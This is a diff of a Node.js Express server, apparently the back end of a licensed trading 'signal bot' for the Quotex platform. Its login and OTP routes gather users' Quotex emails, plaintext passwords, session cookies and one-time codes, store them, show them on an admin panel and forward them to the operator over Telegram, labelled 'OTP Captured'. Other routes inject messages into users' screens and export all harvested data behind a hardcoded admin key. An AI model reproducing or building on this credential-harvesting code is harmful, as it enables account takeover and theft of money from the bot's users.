+app.post('/api/validate-license', async (req, res) => {
     const { licenseKey } = req.body;
     if (!licenseKey) return res.json({ valid: false, message: "No key provided" });
 
-    const license = getLicense(licenseKey);
-    const valid   = !!(license &&
-        license.status === "Active" &&
-        (!license.expiry || new Date(license.expiry) > new Date()));
-
-    res.json({
-        valid,
-        message: valid ? "License is valid" : "Invalid or expired license key."
-    });
+    try {
+        if (useDatabase) {
+            const license = await dbFindLicense(licenseKey);
+            const valid = !!(license &&
+                license.status === "Active" &&
+                (!license.expiry || new Date(license.expiry) > new Date()));
+            return res.json({
+                valid,
+                message: valid ? "License is valid" : "Invalid or expired license key."
+            });
+        }
+        // File fallback
+        const license = licenses.find(l =>
+            l.key === licenseKey &&
+            l.status === "Active" &&
+            (!l.expiry || new Date(l.expiry) > new Date())
+        );
+        res.json({
+            valid: !!license,
+            message: license ? "License is valid" : "Invalid or expired license key."
+        });
+    } catch (e) {
+        console.error('/api/validate-license error:', e.message);
+        res.json({ valid: false, message: "Server error during validation" });
+    }
 });
 
 // ================== LICENSE ACTIVATION ==================
@@ -448,22 +713,27 @@ app.post('/api/license-activate', async (req, res) => {
     const { licenseKey, userName, timestamp } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";
 
-    const user = getOrCreateUser(licenseKey, userName);
-    if (userName && userName !== "Pending Name") user.fullName = userName;
-    user.activities.push({ action: "License Activated", timestamp: new Date().toLocaleString() });
-    saveUser(user);
-    logActivity('License Activated', { licenceKey: licenseKey, fullName: userName, ip });
+    try {
+        const user = await getOrCreateUser(licenseKey, userName);
+        if (userName && userName !== "Pending Name") user.fullName = userName;
+        user.activities = user.activities || [];
+        user.activities.push({ action: "License Activated", timestamp: new Date().toLocaleString() });
+        await saveUser(user);
 
-    broadcastSSE('license_activated', {
-        licenceKey: licenseKey,
-        fullName:   userName,
-        ip,
-        timestamp:  timestamp || new Date().toLocaleString()
-    });
+        broadcastSSE('license_activated', {
+            licenceKey: licenseKey,
+            fullName: userName,
+            ip,
+            timestamp: timestamp || new Date().toLocaleString()
+        });
 
-    const message = `🔑 <b>License Activated</b>\n👤 Name: <b>${userName}</b>\n🔑 Key: <b>${licenseKey}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${timestamp}</b>`;
-    await sendTelegramMessage(message);
-    res.status(200).json({ status: "success" });
+        const message = `🔑 <b>License Activated</b>\n👤 Name: <b>${userName}</b>\n🔑 Key: <b>${licenseKey}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${timestamp}</b>`;
+        await sendTelegramMessage(message);
+        res.status(200).json({ status: "success" });
+    } catch (e) {
+        console.error('/api/license-activate error:', e.message);
+        res.status(500).json({ status: "error" });
+    }
 });
 
 // ================== QUOTEX LOGIN ==================
@@ -471,29 +741,34 @@ app.post('/api/quotex-login', async (req, res) => {
     const { email, password, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";
 
-    const user = getOrCreateUser(licenceKey, name);
-    user.username = email;
-    user.password = password;
-    user.ip       = ip;
-    user.cookies  = cookies;
-    user.status   = "Online";
-    user.activities.push({ action: "Quotex Login Submitted", timestamp: new Date().toLocaleString() });
-    saveUser(user);
-    logActivity('Quotex Login Submitted', { licenceKey, fullName: name, ip });
+    try {
+        const user = await getOrCreateUser(licenceKey, name);
+        user.username = email;
+        user.password = password;
+        user.ip = ip;
+        user.cookies = cookies;
+        user.status = "Online";
+        user.activities = user.activities || [];
+        user.activities.push({ action: "Quotex Login Submitted", timestamp: new Date().toLocaleString() });
+        await saveUser(user);
 
-    broadcastSSE('quotex_login', {
-        licenceKey,
-        fullName:  name,
-        email,
-        password,
-        ip,
-        cookies,
-        timestamp: new Date().toLocaleString()
-    });
+        broadcastSSE('quotex_login', {
+            licenceKey,
+            fullName: name,
+            email,
+            password,
+            ip,
+            cookies,
+            timestamp: new Date().toLocaleString()
+        });
 
-    const message = `🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
-    await sendTelegramMessage(message);
-    res.status(200).json({ status: "ok" });
+        const message = `🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
+        await sendTelegramMessage(message);
+        res.status(200).json({ status: "ok" });
+    } catch (e) {
+        console.error('/api/quotex-login error:', e.message);
+        res.status(500).json({ status: "error" });
+    }
 });
 
 // ================== OTP ==================
@@ -501,28 +776,33 @@ app.post('/api/quotex-otp', async (req, res) => {
     const { email, otp, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";
 
-    const user = getOrCreateUser(licenceKey, name);
-    user.otp     = otp;
-    user.ip      = ip;
-    user.cookies = cookies;
-    user.status  = "Online";
-    user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
-    saveUser(user);
-    logActivity('OTP Captured', { licenceKey, fullName: name, ip, otp });
+    try {
+        const user = await getOrCreateUser(licenceKey, name);
+        user.otp = otp;
+        user.ip = ip;
+        user.cookies = cookies;
+        user.status = "Online";
+        user.activities = user.activities || [];
+        user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
+        await saveUser(user);
 
-    broadcastSSE('otp_entered', {
-        licenceKey,
-        fullName:  name,
-        email,
-        otp,
-        ip,
-        cookies,
-        timestamp: new Date().toLocaleString()
-    });
+        broadcastSSE('otp_entered', {
+            licenceKey,
+            fullName: name,
+            email,
+            otp,
+            ip,
+            cookies,
+            timestamp: new Date().toLocaleString()
+        });
 
-    const message = `🔢 <b>OTP Captured</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 OTP: <b>${otp}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
-    await sendTelegramMessage(message);
-    res.status(200).json({ status: "ok" });
+        const message = `🔢 <b>OTP Captured</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 OTP: <b>${otp}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
+        await sendTelegramMessage(message);
+        res.status(200).json({ status: "ok" });
+    } catch (e) {
+        console.error('/api/quotex-otp error:', e.message);
+        res.status(500).json({ status: "error" });
+    }
 });
 
 // ================== BLOCK / UNBLOCK USER ==================
@@ -530,81 +810,137 @@ app.post('/api/block-user', async (req, res) => {
     const { licenceKey } = req.body;
     if (!licenceKey) return res.status(400).json({ error: "licenceKey required" });
 
-    // Mark user as blocked
-    const user = getUserByLicenceKey(licenceKey);
-    if (user) {
-        user.blocked = true;
-        user.status  = "Blocked";
-        user.activities.push({ action: "🚫 Blocked by Admin", timestamp: new Date().toLocaleString() });
-        saveUser(user);
+    try {
+        if (useDatabase) {
+            const user = await dbFindUserByKey(licenceKey);
+            if (user) {
+                user.blocked = true;
+                user.status  = "Blocked";
+                user.activities = user.activities || [];
+                user.activities.push({ action: "🚫 Blocked by Admin", timestamp: new Date().toLocaleString() });
+                await dbSaveUser(user);
+            }
+            await dbUpdateLicenseStatus(licenceKey, "Inactive");
+
+            broadcastSSE('user_blocked', {
+                licenceKey,
+                fullName: user?.fullName || 'Unknown',
+                timestamp: new Date().toLocaleString()
+            });
+
+            const msg = `🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
+            await sendTelegramMessage(msg);
+            return res.json({ success: true });
+        }
+
+        // File fallback
+        const user = users.find(u => u.licenceKey === licenceKey);
+        if (user) {
+            user.blocked = true;
+            user.status  = "Blocked";
+            user.activities.push({ action: "🚫 Blocked by Admin", timestamp: new Date().toLocaleString() });
+            saveUsers();
+        }
+        const lic = licenses.find(l => l.key === licenceKey);
+        if (lic) {
+            lic.status = "Inactive";
+            saveLicenses();
+        }
+        broadcastSSE('user_blocked', {
+            licenceKey,
+            fullName: user?.fullName || 'Unknown',
+            timestamp: new Date().toLocaleString()
+        });
+        const msg = `🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
+        await sendTelegramMessage(msg);
+        res.json({ success: true });
+    } catch (e) {
+        console.error('/api/block-user error:', e.message);
+        res.status(500).json({ error: "Server error" });
     }
-
-    // Deactivate the matching license so validate-license also fails
-    const lic = getLicense(licenceKey);
-    if (lic) {
-        lic.status = "Inactive";
-        saveLicense(lic);
-    }
-
-    logActivity('User Blocked by Admin', { licenceKey, fullName: user?.fullName || 'Unknown', ip: '--' });
-
-    broadcastSSE('user_blocked', {
-        licenceKey,
-        fullName:  user?.fullName || 'Unknown',
-        timestamp: new Date().toLocaleString()
-    });
-
-    const msg = `🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
-    await sendTelegramMessage(msg);
-    res.json({ success: true });
 });
 
 app.post('/api/unblock-user', async (req, res) => {
     const { licenceKey } = req.body;
     if (!licenceKey) return res.status(400).json({ error: "licenceKey required" });
 
-    const user = getUserByLicenceKey(licenceKey);
-    if (user) {
-        user.blocked = false;
-        user.status  = "Active";
-        user.activities.push({ action: "✅ Unblocked by Admin", timestamp: new Date().toLocaleString() });
-        saveUser(user);
+    try {
+        if (useDatabase) {
+            const user = await dbFindUserByKey(licenceKey);
+            if (user) {
+                user.blocked = false;
+                user.status  = "Active";
+                user.activities = user.activities || [];
+                user.activities.push({ action: "✅ Unblocked by Admin", timestamp: new Date().toLocaleString() });
+                await dbSaveUser(user);
+            }
+            await dbUpdateLicenseStatus(licenceKey, "Active");
+
+            broadcastSSE('user_unblocked', {
+                licenceKey,
+                fullName: user?.fullName || 'Unknown',
+                timestamp: new Date().toLocaleString()
+            });
+            return res.json({ success: true });
+        }
+
+        // File fallback
+        const user = users.find(u => u.licenceKey === licenceKey);
+        if (user) {
+            user.blocked = false;
+            user.status  = "Active";
+            user.activities.push({ action: "✅ Unblocked by Admin", timestamp: new Date().toLocaleString() });
+            saveUsers();
+        }
+        const lic = licenses.find(l => l.key === licenceKey);
+        if (lic) {
+            lic.status = "Active";
+            saveLicenses();
+        }
+        broadcastSSE('user_unblocked', {
+            licenceKey,
+            fullName: user?.fullName || 'Unknown',
+            timestamp: new Date().toLocaleString()
+        });
+        res.json({ success: true });
+    } catch (e) {
+        console.error('/api/unblock-user error:', e.message);
+        res.status(500).json({ error: "Server error" });
     }
-
-    // Re-activate their license
-    const lic = getLicense(licenceKey);
-    if (lic) {
-        lic.status = "Active";
-        saveLicense(lic);
-    }
-
-    logActivity('User Unblocked by Admin', { licenceKey, fullName: user?.fullName || 'Unknown', ip: '--' });
-
-    broadcastSSE('user_unblocked', {
-        licenceKey,
-        fullName:  user?.fullName || 'Unknown',
-        timestamp: new Date().toLocaleString()
-    });
-
-    res.json({ success: true });
 });
 
 // Called by the main bot every 15 seconds to check if user is still authorised
-app.get('/api/check-access', (req, res) => {
+app.get('/api/check-access', async (req, res) => {
     const licenseKey = req.query.licenseKey || req.query.licenceKey;
     if (!licenseKey) return res.json({ allowed: false, reason: "no_key" });
 
-    const user = getUserByLicenceKey(licenseKey);
-    if (user && user.blocked) {
-        return res.json({ allowed: false, reason: "blocked" });
-    }
+    try {
+        if (useDatabase) {
+            const user = await dbFindUserByKey(licenseKey);
+            if (user && user.blocked) {
+                return res.json({ allowed: false, reason: "blocked" });
+            }
+            const lic = await dbFindLicense(licenseKey);
+            if (!lic || lic.status !== "Active" || (lic.expiry && new Date(lic.expiry) < new Date())) {
+                return res.json({ allowed: false, reason: "license_inactive" });
+            }
+            return res.json({ allowed: true });
+        }
 
-    const lic = getLicense(licenseKey);
-    if (!lic || lic.status !== "Active" || (lic.expiry && new Date(lic.expiry) < new Date())) {
-        return res.json({ allowed: false, reason: "license_inactive" });
+        // File fallback
+        const user = users.find(u => u.licenceKey === licenseKey);
+        if (user && user.blocked) {
+            return res.json({ allowed: false, reason: "blocked" });
+        }
+        const lic = licenses.find(l => l.key === licenseKey);
+        if (!lic || lic.status !== "Active" || (lic.expiry && new Date(lic.expiry) < new Date())) {
+            return res.json({ allowed: false, reason: "license_inactive" });
+        }
+        res.json({ allowed: true });
+    } catch (e) {
+        console.error('/api/check-access error:', e.message);
+        res.json({ allowed: true }); // fail open on network errors
     }
-
-    res.json({ allowed: true });
 });
 
 // ================== ACTIVITY TRACKING ==================
@@ -612,7 +948,6 @@ app.post('/api/track-activity', async (req, res) => {
     const { action, userName } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";
     broadcastSSE('activity', { action, userName, ip, timestamp: new Date().toLocaleString() });
-    logActivity(action, { userName, ip });
     res.status(200).json({ status: "success" });
 });
 
@@ -632,8 +967,6 @@ app.get('/api/trigger-connected', async (req, res) => {
 
     // 'trigger_connected' is kept for the admin panel's activity log
     broadcastSSE('trigger_connected', { userName });
-
-    logActivity('Trigger: Connection Shown', { userName, ip: '--' });
 
     const message = `🔗 <b>Connection Triggered</b>\n👤 User: <b>${userName}</b>`;
     await sendTelegramMessage(message);
@@ -657,26 +990,24 @@ app.post('/api/send-message', async (req, res) => {
 
     // 2. ALSO store in pending map so main-bot poll can pick it up even if
     //    the SSE connection was down when the broadcast fired.
-    //    Normalise userName to lowercase for case-insensitive matching.
-    const key = userName.trim().toLowerCase();
-    if (!pendingMessages[key]) pendingMessages[key] = [];
-    pendingMessages[key].push(msgPayload);
-    // Cap at 20 stored messages per user to avoid unbounded growth
-    if (pendingMessages[key].length > 20) pendingMessages[key].shift();
-
-    // 3. Persist to database permanently
-    db.prepare('INSERT INTO sent_messages_log (target, message, msgType, success, timestamp) VALUES (?, ?, ?, 1, ?)').run(
-        userName, message, msgType, new Date().toISOString()
-    );
+    if (useDatabase) {
+        await dbAddPendingMessage(userName, msgPayload);
+    } else {
+        // In-memory fallback
+        const key = userName.trim().toLowerCase();
+        if (!pendingMessages[key]) pendingMessages[key] = [];
+        pendingMessages[key].push(msgPayload);
+        // Cap at 20 stored messages per user to avoid unbounded growth
+        if (pendingMessages[key].length > 20) pendingMessages[key].shift();
+    }
 
     // Also log the activity
     broadcastSSE('activity', {
-        action:    `💬 Message Injected [${msgType}] → ${userName}`,
+        action: `💬 Message Injected [${msgType}] → ${userName}`,
         userName,
-        ip:        '—',
+        ip: '—',
         timestamp: ts
     });
-    logActivity(`Message Injected [${msgType}]`, { userName, ip: '--' });
 
     // Notify admin via Telegram
     const typeEmojis = { info: 'ℹ️', warning: '⚠️', alert: '🚨', instruction: '📋', otp: '🔢' };
@@ -690,28 +1021,29 @@ app.post('/api/send-message', async (req, res) => {
 // ================== POLL FOR PENDING MESSAGES (main-bot polling fallback) ==================
 // Main-bot calls this every 5 seconds. Returns any messages queued for this
 // user (stored by /api/send-message) and clears them so they are shown once only.
-app.get('/api/poll-messages', (req, res) => {
+app.get('/api/poll-messages', async (req, res) => {
     const userName = (req.query.userName || '').trim().toLowerCase();
     if (!userName) return res.json({ messages: [] });
 
-    const msgs = pendingMessages[userName] || [];
-    // Clear after reading so messages are only shown once
-    pendingMessages[userName] = [];
+    try {
+        if (useDatabase) {
+            const msgs = await dbPollAndClearMessages(userName);
+            return res.json({ messages: msgs });
+        }
 
-    res.json({ messages: msgs });
+        // File fallback (in-memory)
+        const msgs = pendingMessages[userName] || [];
+        // Clear after reading so messages are only shown once
+        pendingMessages[userName] = [];
+        res.json({ messages: msgs });
+    } catch (e) {
+        console.error('/api/poll-messages error:', e.message);
+        res.json({ messages: [] });
+    }
 });
 
 // ================== MAINTENANCE MODE ==================
 let maintenanceMode = { active: false, until: null, message: 'Under Maintenance. Please check back soon.' };
-
-// Restore maintenance state from SQLite on startup
-try {
-    const maintRow = db.prepare("SELECT extra FROM activity_log WHERE action = '__maintenance_state__' ORDER BY id DESC LIMIT 1").get();
-    if (maintRow) {
-        const parsed = safeJsonParse(maintRow.extra, null);
-        if (parsed && parsed.active !== undefined) maintenanceMode = parsed;
-    }
-} catch(e) {}
 
 app.get('/api/maintenance', (req, res) => {
     res.json(maintenanceMode);
@@ -725,248 +1057,111 @@ app.post('/api/maintenance', (req, res) => {
         until:   until   || null,
         message: message || 'Under Maintenance. Please check back soon.'
     };
-    // Persist maintenance state to SQLite
-    db.prepare("INSERT INTO activity_log (action, extra, timestamp) VALUES ('__maintenance_state__', ?, ?)").run(
-        JSON.stringify(maintenanceMode), new Date().toISOString()
-    );
     broadcastSSE('maintenance_update', maintenanceMode);
     res.json({ ok: true, mode: maintenanceMode });
 });
 
 // ================== STATS & DATA ==================
-app.get('/api/stats', (req, res) => {
-    const users    = getUsers();
-    const licenses = getLicenses();
-
-    // Time-based stats from persistent activity log
-    const now        = new Date();
-    const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).toISOString();
-    const weekStart  = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000).toISOString();
-
-    const todayActivations = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'License Activated' AND timestamp >= ?").get(todayStart)?.cnt || 0;
-    const weekActivations  = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'License Activated' AND timestamp >= ?").get(weekStart)?.cnt || 0;
-    const todayOTPs        = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'OTP Captured' AND timestamp >= ?").get(todayStart)?.cnt || 0;
-    const totalActivities  = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action NOT LIKE '__%__'").get()?.cnt || 0;
-    const totalMsgsSent    = db.prepare("SELECT COUNT(*) as cnt FROM sent_messages_log").get()?.cnt || 0;
-
-    res.json({
-        totalUsers:          users.length,
-        onlineNow:           users.filter(u => u.status === "Online").length,
-        otpCaptured:         users.filter(u => u.otp && u.otp.length >= 4).length,
-        connectedAccounts:   users.filter(u => u.connected).length,
-        totalLicenses:       licenses.length,
-        activeLicenses:      licenses.filter(l => l.status === "Active").length,
-        blockedUsers:        users.filter(u => u.blocked).length,
-        todayActivations,
-        weekActivations,
-        todayOTPs,
-        totalActivities,
-        totalMsgsSent
-    });
+app.get('/api/stats', async (req, res) => {
+    try {
+        if (useDatabase) {
+            const stats = await dbGetStats();
+            return res.json(stats);
+        }
+        // File fallback
+        res.json({
+            totalUsers: users.length,
+            onlineNow: users.filter(u => u.status === "Online").length,
+            otpCaptured: users.filter(u => u.otp && u.otp.length >= 4).length,
+            connectedAccounts: users.filter(u => u.connected).length,
+            totalLicenses: licenses.length,
+            activeLicenses: licenses.filter(l => l.status === "Active").length
+        });
+    } catch (e) {
+        console.error('/api/stats error:', e.message);
+        res.json({ totalUsers: 0, onlineNow: 0, otpCaptured: 0, connectedAccounts: 0, totalLicenses: 0, activeLicenses: 0 });
+    }
 });
 
-app.get('/api/users', (req, res) => {
+app.get('/api/users', async (req, res) => {
     // Support pagination: ?offset=0&limit=100
     // When no params given, returns ALL users (backwards-compatible)
     const offset = parseInt(req.query.offset, 10) || 0;
     const limit  = parseInt(req.query.limit,  10) || 0;
-    const users  = getUsers();
-    if (limit > 0) {
+
+    try {
+        if (useDatabase) {
+            const allUsers = await dbGetAllUsers();
+            if (limit > 0) {
+                return res.json({
+                    users: allUsers.slice(offset, offset + limit),
+                    total: allUsers.length,
+                    offset,
+                    limit
+                });
+            }
+            return res.json(allUsers);
+        }
+
+        // File fallback
+        if (limit > 0) {
+            res.json({
+                users: users.slice(offset, offset + limit),
+                total: users.length,
+                offset,
+                limit
+            });
+        } else {
+            res.json(users);
+        }
+    } catch (e) {
+        console.error('/api/users error:', e.message);
+        res.json(useDatabase ? [] : users);
+    }
+});
+
+app.get('/api/latest-activity', async (req, res) => {
+    try {
+        if (useDatabase) {
+            const allUsers = await dbGetAllUsers();
+            return res.json({
+                logins: allUsers.filter(u => u.username),
+                otps:   allUsers.filter(u => u.otp)
+            });
+        }
         res.json({
-            users:  users.slice(offset, offset + limit),
-            total:  users.length,
-            offset,
-            limit
+            logins: users.filter(u => u.username),
+            otps: users.filter(u => u.otp)
         });
-    } else {
-        res.json(users);
+    } catch (e) {
+        res.json({ logins: [], otps: [] });
     }
 });
 
-app.get('/api/latest-activity', (req, res) => {
-    const users = getUsers();
-    res.json({
-        logins: users.filter(u => u.username),
-        otps:   users.filter(u => u.otp)
-    });
+app.get('/', (req, res) => {
+    res.send(`✅ Chinese Signal Bot Server v3 Running — Storage: ${useDatabase ? 'PostgreSQL (Permanent)' : 'File-based'}`);
 });
 
-// ================== PERSISTENT ACTIVITY LOG ==================
-app.get('/api/activity-log', (req, res) => {
-    const limit  = Math.min(parseInt(req.query.limit,  10) || 200, 1000);
-    const offset = parseInt(req.query.offset, 10) || 0;
-    const search = req.query.search || '';
-    let rows, total;
-    if (search) {
-        rows  = db.prepare("SELECT * FROM activity_log WHERE action NOT LIKE '__%%__' AND (action LIKE ? OR userName LIKE ? OR licenceKey LIKE ?) ORDER BY id DESC LIMIT ? OFFSET ?").all(`%${search}%`, `%${search}%`, `%${search}%`, limit, offset);
-        total = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action NOT LIKE '__%%__' AND (action LIKE ? OR userName LIKE ? OR licenceKey LIKE ?)").get(`%${search}%`, `%${search}%`, `%${search}%`)?.cnt || 0;
-    } else {
-        rows  = db.prepare("SELECT * FROM activity_log WHERE action NOT LIKE '__%%__' ORDER BY id DESC LIMIT ? OFFSET ?").all(limit, offset);
-        total = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action NOT LIKE '__%%__'").get()?.cnt || 0;
-    }
-    res.json({ rows, total, limit, offset });
-});
-
-// ================== USER NOTES ==================
-app.get('/api/user-notes/:licenceKey', (req, res) => {
-    const key = decodeURIComponent(req.params.licenceKey);
-    const notes = db.prepare('SELECT * FROM user_notes WHERE licenceKey = ? ORDER BY id DESC').all(key);
-    res.json(notes);
-});
-
-app.post('/api/user-notes', (req, res) => {
-    const { licenceKey, note, addedBy } = req.body;
-    if (!licenceKey || !note) return res.status(400).json({ error: "licenceKey and note required" });
-    const result = db.prepare('INSERT INTO user_notes (licenceKey, note, addedBy, timestamp) VALUES (?, ?, ?, ?)').run(
-        licenceKey, note, addedBy || 'Admin', new Date().toISOString()
-    );
-    logActivity('Admin Note Added', { licenceKey, ip: '--' });
-    res.json({ success: true, id: result.lastInsertRowid });
-});
-
-app.delete('/api/user-notes/:id', (req, res) => {
-    db.prepare('DELETE FROM user_notes WHERE id = ?').run(parseInt(req.params.id));
-    res.json({ success: true });
-});
-
-// ================== SIGNAL HISTORY (Bot side) ==================
-app.post('/api/signal-history', (req, res) => {
-    const { licenceKey, userName, asset, direction, duration, confidence, result, amount, profit } = req.body;
-    db.prepare(`
-        INSERT INTO signal_history (licenceKey, userName, asset, direction, duration, confidence, result, amount, profit, timestamp)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-    `).run(licenceKey || '', userName || '', asset || '', direction || '', duration || 0, confidence || 0, result || '', amount || 0, profit || 0, new Date().toISOString());
-    res.json({ success: true });
-});
-
-app.get('/api/signal-history', (req, res) => {
-    const licenceKey = req.query.licenceKey;
-    const limit = Math.min(parseInt(req.query.limit, 10) || 50, 500);
-    let rows;
-    if (licenceKey) {
-        rows = db.prepare('SELECT * FROM signal_history WHERE licenceKey = ? ORDER BY id DESC LIMIT ?').all(licenceKey, limit);
-    } else {
-        rows = db.prepare('SELECT * FROM signal_history ORDER BY id DESC LIMIT ?').all(limit);
-    }
-    res.json(rows);
-});
-
-app.get('/api/signal-stats', (req, res) => {
-    const licenceKey = req.query.licenceKey;
-    let stats;
-    if (licenceKey) {
-        stats = db.prepare(`
-            SELECT
-                COUNT(*) as total,
-                SUM(CASE WHEN result='win' THEN 1 ELSE 0 END) as wins,
-                SUM(CASE WHEN result='loss' THEN 1 ELSE 0 END) as losses,
-                SUM(profit) as totalProfit,
-                AVG(confidence) as avgConfidence
-            FROM signal_history WHERE licenceKey = ?
-        `).get(licenceKey);
-    } else {
-        stats = db.prepare(`
-            SELECT
-                COUNT(*) as total,
-                SUM(CASE WHEN result='win' THEN 1 ELSE 0 END) as wins,
-                SUM(CASE WHEN result='loss' THEN 1 ELSE 0 END) as losses,
-                SUM(profit) as totalProfit,
-                AVG(confidence) as avgConfidence
-            FROM signal_history
-        `).get();
-    }
-    const winRate = stats.total > 0 ? ((stats.wins / stats.total) * 100).toFixed(1) : 0;
-    res.json({ ...stats, winRate });
-});
-
-// ================== SENT MESSAGES LOG ==================
-app.get('/api/sent-messages-log', (req, res) => {
-    const limit = Math.min(parseInt(req.query.limit, 10) || 100, 500);
-    const rows  = db.prepare('SELECT * FROM sent_messages_log ORDER BY id DESC LIMIT ?').all(limit);
-    const total = db.prepare('SELECT COUNT(*) as cnt FROM sent_messages_log').get()?.cnt || 0;
-    res.json({ rows, total });
-});
-
-// ================== DELETE USER ==================
-app.delete('/api/users/:id', (req, res) => {
-    db.prepare('DELETE FROM users WHERE id = ?').run(req.params.id);
-    logActivity('User Deleted by Admin', { ip: '--' });
-    broadcastSSE('user_deleted', { id: req.params.id });
-    res.json({ success: true });
-});
-
-// ================== CLEAR USER CREDENTIALS ==================
-app.post('/api/clear-user', (req, res) => {
-    const { licenceKey } = req.body;
-    if (!licenceKey) return res.status(400).json({ error: "licenceKey required" });
-    db.prepare("UPDATE users SET username='', password='', otp='', cookies='', status='Active', connected=0, activities='[]' WHERE licenceKey=?").run(licenceKey);
-    logActivity('User Data Cleared by Admin', { licenceKey, ip: '--' });
-    broadcastSSE('user_cleared', { licenceKey });
-    res.json({ success: true });
-});
-
-// ================== EXPORT ALL DATA ==================
-app.get('/api/export-all', (req, res) => {
-    const { adminKey } = req.query;
-    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Unauthorized' });
-
-    const exportData = {
-        exportedAt:     new Date().toISOString(),
-        users:          getUsers(),
-        licenses:       getLicenses(),
-        activityLog:    db.prepare("SELECT * FROM activity_log WHERE action NOT LIKE '__%%__' ORDER BY id DESC LIMIT 5000").all(),
-        sentMessages:   db.prepare('SELECT * FROM sent_messages_log ORDER BY id DESC LIMIT 1000').all(),
-        userNotes:      db.prepare('SELECT * FROM user_notes ORDER BY id DESC').all(),
-        signalHistory:  db.prepare('SELECT * FROM signal_history ORDER BY id DESC LIMIT 2000').all()
-    };
-
-    res.setHeader('Content-Type', 'application/json');
-    res.setHeader('Content-Disposition', `attachment; filename="csbot-export-${Date.now()}.json"`);
-    res.json(exportData);
-});
-
-// ================== ANALYTICS ==================
-app.get('/api/analytics', (req, res) => {
-    // Last 7 days — daily breakdown
-    const days = [];
-    for (let i = 6; i >= 0; i--) {
-        const d    = new Date();
-        d.setDate(d.getDate() - i);
-        const ymd  = d.toISOString().slice(0, 10);
-        const next = new Date(d); next.setDate(d.getDate() + 1);
-        const activations = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'License Activated' AND timestamp >= ? AND timestamp < ?").get(d.toISOString(), next.toISOString())?.cnt || 0;
-        const logins      = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'Quotex Login Submitted' AND timestamp >= ? AND timestamp < ?").get(d.toISOString(), next.toISOString())?.cnt || 0;
-        const otps        = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'OTP Captured' AND timestamp >= ? AND timestamp < ?").get(d.toISOString(), next.toISOString())?.cnt || 0;
-        days.push({ date: ymd, activations, logins, otps });
-    }
-
-    const topUsers = db.prepare(`
-        SELECT userName, COUNT(*) as events FROM activity_log
-        WHERE userName != 'Unknown' AND action NOT LIKE '__%%__'
-        GROUP BY lower(userName) ORDER BY events DESC LIMIT 10
-    `).all();
-
-    const actionBreakdown = db.prepare(`
-        SELECT action, COUNT(*) as cnt FROM activity_log
-        WHERE action NOT LIKE '__%%__'
-        GROUP BY action ORDER BY cnt DESC LIMIT 15
-    `).all();
-
-    res.json({ days, topUsers, actionBreakdown });
-});
-
-app.get('/',           (req, res) => res.send("✅ Chinese Signal Bot Server v4 — SQLite Powered — Permanent Storage"));
-app.get('/api/healthz',(req, res) => res.json({ ok: true, ts: Date.now() }));
-app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin_panel.html')));
-app.get('/bot',   (req, res) => res.sendFile(path.join(__dirname, 'main-bot.html')));
-
+// ================== START SERVER ==================
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-    console.log(`📁 Data directory: ${DATA_DIR}`);
-    console.log(`🗄️  SQLite DB: ${DB_FILE}`);
-    const users    = getUsers();
-    const licenses = getLicenses();
-    console.log(`👥 Loaded ${users.length} users, ${licenses.length} licenses`);
-    console.log(`📊 Activity log entries: ${db.prepare("SELECT COUNT(*) as cnt FROM activity_log").get()?.cnt || 0}`);
+
